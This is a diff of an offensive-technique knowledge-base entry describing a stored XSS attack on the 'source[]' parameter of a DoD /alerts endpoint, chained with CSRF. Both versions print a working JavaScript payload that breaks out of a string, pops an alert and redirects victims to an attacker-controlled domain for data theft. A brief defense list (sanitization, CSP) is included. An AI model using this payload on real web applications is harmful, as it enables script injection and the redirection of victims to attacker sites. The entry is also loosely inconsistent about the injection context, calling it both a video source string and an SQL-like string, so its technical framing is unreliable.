@@ -1,4 +1,5 @@
 ---
+id: p1b2c3d4-e5f6-7890-abcd-ef1234567891
 tags:
   - xss
   - javascript
@@ -13,15 +14,14 @@ verified: false
 platforms:
   - Web
 submitted: true
-created_at: '2023-10-01T00:00:00Z'
+created_at: '2023-10-01T12:00:00Z'
 techniques:
   - '[[JavaScript]]'
-updated_at: '2025-12-13T23:52:25.188Z'
+updated_at: '2025-12-14T17:27:49.609Z'
 skill_level: intermediate
 impact_level: high
 detection_risk: low
 sub_techniques: []
-id: 2d9f8592-6ba7-4532-b341-26f441c3dd7d
 validated: true
 mitre_tactics:
   - '[[Execution]]'
@@ -32,53 +32,50 @@ mitre_techniques:
 
 ## Summary
 
-This procedure outlines crafting a JavaScript payload designed to escape string contexts in the 'source' parameter of a web application's alerts endpoint, enabling stored XSS execution to demonstrate compromise.
+This procedure creates a JavaScript payload for XSS injection via a vulnerable parameter in a web application, exploiting insufficient sanitization to execute code in the victim's browser, such as displaying alerts and redirecting to an attacker site.
 
 ## Description
 
-In scenarios where input sanitization is inadequate, attackers can inject JavaScript that closes unintended string delimiters (e.g., quotes in SQL or HTML attributes) and executes code. This payload is tailored for the alerts creation endpoint, triggering an alert for proof-of-concept and redirecting to an attacker-controlled site for data exfiltration. Prerequisites include knowledge of the parameter's context (e.g., treated as a video source string) and access to test the payload.
+In the context of a CSRF-chained attack on the DoD /alerts endpoint, the 'source[]' parameter lacks proper escaping, allowing closure of a SQL-like string and injection of JavaScript. The payload demonstrates compromise by alerting 'Hacked by k0x' and redirecting after 5 seconds. Prerequisites include understanding the injection point from reconnaissance (e.g., via Burp Suite testing).
 
 ## Requirements
 
-1. Understanding of the target's input handling (e.g., 'source' as array parameter)
-2. Browser developer tools for testing payload execution
-3. Attacker-controlled domain for redirects (e.g., https://k0x.xyz)
+1. Knowledge of the target parameter ('source[]') and its context (SQL-like string)
+2. Basic JavaScript skills for payload crafting
+3. Test environment or proxy tool to validate payload
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Implement strict input validation and sanitization (e.g., escape quotes, reject script tags)
-- Use Content Security Policy (CSP) to block inline JavaScript execution
-- Monitor for anomalous alerts creation or JavaScript errors in logs
+- Implement strict input sanitization and output encoding for user inputs
+- Use Content Security Policy (CSP) to restrict script execution
+- Monitor for anomalous JavaScript execution or redirects in browser logs
 
 ## Objectives
 
-1. Break out of string context to inject executable JavaScript
-2. Demonstrate XSS via visible alert
-3. Facilitate data exfiltration via redirect
+1. Inject executable JavaScript to prove XSS vulnerability
+2. Perform actions like data theft or redirects
+3. Chain with CSRF for stealthy delivery
 
 ## Instructions
 
-### Step 1: Design Payload Structure
+### Step 1: Analyze Injection Point
 
-**Context**: Analyze the 'source' parameter context to craft an escape sequence.
+**Context**: Identify the vulnerable parameter and craft a payload that closes the string context.
+
+No command needed; review application behavior to confirm 'source[]' is unsanitized.
+
+### Step 2: Build and Test Payload
+
+**Context**: Create the JavaScript to execute an alert and delayed redirect.
 
 **Command** ([[commands/xss-payload-injection]]):
-
 ```javascript
-video"); alert('Hacked by k0x'); setTimeout(()=>location.href='https://k0x.xyz',5000);//
+video");alert('Hacked by k0x');setTimeout(()=>location.href='https://k0x.xyz',5000);//
 ```
 
-> This payload assumes 'source' is injected into a string like "video". It closes the quote with ", executes the alert, adds a 5-second delay for observation, redirects to exfiltrate data implicitly, and comments out the rest with // to avoid syntax errors.
-
-### Step 2: Test Payload in Isolation
-
-**Context**: Validate the payload executes without errors in a browser console or local HTML.
-
-Embed in a test form and submit to a mock endpoint, then view the rendered output to confirm alert and redirect.
-
-> Expected: Alert pops up, page redirects after 5 seconds.
+> This payload closes the string with "; executes the alert to show compromise, then uses setTimeout for a 5-second redirect to the attacker's site. Test in a local HTML file or proxy to ensure no syntax errors; expected output is an alert box and page redirect.
 
 ## MITRE ATT&CK Mapping
 
@@ -102,6 +99,6 @@ Embed in a test form and submit to a mock endpoint, then view the rendered outpu
 
 ## Tags
 
-- xss
-- javascript
-- payload
+- [[xss]]
+- [[JavaScript]]
+- [[payload]]
